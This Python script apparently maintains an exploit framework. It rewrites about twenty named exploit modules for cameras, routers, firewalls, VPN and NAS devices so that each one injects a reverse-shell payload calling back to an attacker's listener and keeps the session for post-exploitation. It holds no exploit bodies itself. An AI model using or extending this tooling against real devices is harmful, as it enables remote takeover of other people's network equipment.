#!/usr/bin/env python3
"""
Upgrade top exploit modules to use ShellHandler for full interactive shell.

Adds:
  1. Import of ShellHandler + reverse_shell_payload
  2. Replaces simple _start_listener() with ShellHandler
  3. Adds TTY upgrade after connection
  4. Stores session object for post-exploitation

Run from EmbedXPL-Forge root:
  python3 tools/upgrade_shell_handler.py [--dry-run]
"""

from __future__ import annotations

import argparse
import re
import sys
from pathlib import Path

BASE = Path(__file__).resolve().parent.parent

HANDLER_IMPORT = (
    "from embedxpl.core.shells import ShellHandler, reverse_shell_payload\n"
)

# Replacement for simple background TCP listener
OLD_LISTENER_PATTERN = re.compile(
    r"def _start_listener\(self.*?\n(?:[ \t]+.*\n)*?[ \t]+threading\.Thread.*?\n[ \t]+.*?start\(\)\n"
    r"[ \t]+time\.sleep.*?\n",
    re.DOTALL,
)

NEW_LISTENER = '''    def _start_listener(self, lhost: str, lport: int) -> None:
        """Launch ShellHandler listener in background thread."""
        handler = ShellHandler(lhost=lhost, lport=lport, timeout=30)
        t = handler.background_listen(callback=None)
        self._shell_handler = handler
        time.sleep(0.5)

'''

# Pattern to upgrade simple revshell command delivery
REVSHELL_DELIVERY_PATTERN = re.compile(
    r"(shell\s*=\s*_REVSHELL_CMD\.format\(lhost=\w+,\s*lport=\w+\))\s*\n"
    r"(\s*)(self\._inject\(client,\s*shell\))",
    re.MULTILINE,
)

NEW_REVSHELL_DELIVERY = r"""\1
\2payload = reverse_shell_payload(str(self.lhost), int(self.lport), shell_type="auto")
\2self._inject(client, payload)"""

# Top modules to upgrade (highest impact)
TOP_MODULES = [
    "embedxpl/modules/exploits/cameras/annke/annke_dvr_nvr_unauth_rce_cve_2021_32941.py",
    "embedxpl/modules/exploits/cameras/uniview/uniview_nvr_unauth_rce_cve_2024_37630.py",
    "embedxpl/modules/exploits/cameras/zivif/ipcheck_rce_cve_2017_17105.py",
    "embedxpl/modules/exploits/cameras/multi/cctv_dvr_rce.py",
    "embedxpl/modules/exploits/routers/tplink/wr940n_740n_841n_ssid_cmd_injection_cve_2023_33538.py",
    "embedxpl/modules/exploits/routers/tplink/archer_mr600_cmd_injection_cve_2025_14756.py",
    "embedxpl/modules/exploits/routers/tplink/archer_be230_auth_cmd_injection_cve_2026_0630.py",
    "embedxpl/modules/exploits/routers/netgear/xr1000_unauth_rce_cve_2025_25246.py",
    "embedxpl/modules/exploits/routers/netgear/r6100_cgimain_bof_cve_2025_29044.py",
    "embedxpl/modules/exploits/routers/ubiquiti/unifi_os_rce_cve_2026_34910.py",
    "embedxpl/modules/exploits/routers/glinet/glinet_auth_cmd_injection_cve_2024_57391.py",
    "embedxpl/modules/exploits/firewalls/paloalto/panos_root_cmd_injection_cve_2026_0273.py",
    "embedxpl/modules/exploits/firewalls/fortinet/fortios_heap_overflow_rce_cve_2026_25249.py",
    "embedxpl/modules/exploits/firewalls/fortinet/forticlient_ems_preauth_rce_cve_2026_35616.py",
    "embedxpl/modules/exploits/firewalls/cisco/cisco_fmc_auth_bypass_rce_cve_2026_20079.py",
    "embedxpl/modules/exploits/firewalls/checkpoint/checkpoint_remote_code_exec_cve_2023_28461.py",
    "embedxpl/modules/exploits/vpn/ivanti/connect_secure_stack_rce_cve_2025_22457.py",
    "embedxpl/modules/exploits/vpn/sonicwall/sma100_preauth_rce_cve_2025_23006.py",
    "embedxpl/modules/exploits/nas/dlink/nas_account_mgr_cgi_rce_cve_2024_10914.py",
    "embedxpl/modules/exploits/nas/qnap/qts_sql_injection_rce_cve_2022_27596.py",
]


def upgrade_module(path: Path, dry_run: bool = False) -> bool:
    if not path.exists():
        return False
    content = path.read_text(encoding="utf-8", errors="replace")
    new_content = content

    # 1. Add ShellHandler import
    if "ShellHandler" not in new_content:
        # Find first import line and add after
        import_match = re.search(r"^import |^from ", new_content, re.MULTILINE)
        if import_match:
            # Add at beginning of imports
            pos = import_match.start()
            new_content = new_content[:pos] + HANDLER_IMPORT + new_content[pos:]
        else:
            new_content = HANDLER_IMPORT + new_content

    # 2. Replace old _start_listener if present
    if OLD_LISTENER_PATTERN.search(new_content):
        new_content = OLD_LISTENER_PATTERN.sub(NEW_LISTENER, new_content)

    # 3. Upgrade revshell command to use reverse_shell_payload()
    if "_REVSHELL_CMD.format" in new_content:
        new_content = REVSHELL_DELIVERY_PATTERN.sub(NEW_REVSHELL_DELIVERY, new_content)

    # 4. Add _shell_handler attribute to __init__ or class body
    if "_shell_handler" not in new_content and "self._shell_handler" in new_content:
        # It's used but not declared - add to class body
        class_match = re.search(r"class Exploit.*?:\s*\n", new_content)
        if class_match:
            insert_at = class_match.end()
            new_content = (
                new_content[:insert_at]
                + "    _shell_handler = None  # Active ShellHandler session\n\n"
                + new_content[insert_at:]
            )

    if new_content == content:
        return False

    if not dry_run:
        path.write_text(new_content, encoding="utf-8")
    return True


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--dry-run", action="store_true")
    parser.add_argument("--all", action="store_true", help="Upgrade ALL shell-capable modules")
    args = parser.parse_args()

    if args.all:
        modules = list((BASE / "embedxpl" / "modules" / "exploits").rglob("*.py"))
        modules = [m for m in modules if m.name != "__init__.py"]
    else:
        modules = [BASE / m for m in TOP_MODULES]

    upgraded = 0
    for path in modules:
        if upgrade_module(path, dry_run=args.dry_run):
            upgraded += 1
            rel = path.relative_to(BASE)
            print(f"  [{'DRY' if args.dry_run else 'OK'}] {rel}")

    print(f"\nUpgraded {upgraded} modules to use ShellHandler")


if __name__ == "__main__":
    main()
